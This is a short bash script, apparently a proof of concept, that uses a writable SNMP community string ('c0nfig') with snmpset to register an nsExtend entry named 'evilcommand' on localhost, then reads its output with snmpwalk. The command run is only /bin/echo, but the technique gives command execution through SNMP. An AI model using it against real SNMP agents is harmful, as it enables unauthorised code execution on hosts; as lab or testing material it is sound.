#!/bin/bash

snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
    'nsExtendStatus."evilcommand"'  = createAndGo \
    'nsExtendCommand."evilcommand"' = /bin/echo \
    'nsExtendArgs."evilcommand"'    = 'hello world'

snmpwalk -v2c -c c0nfig localhost nsExtendObjects | grep "evilcommand"
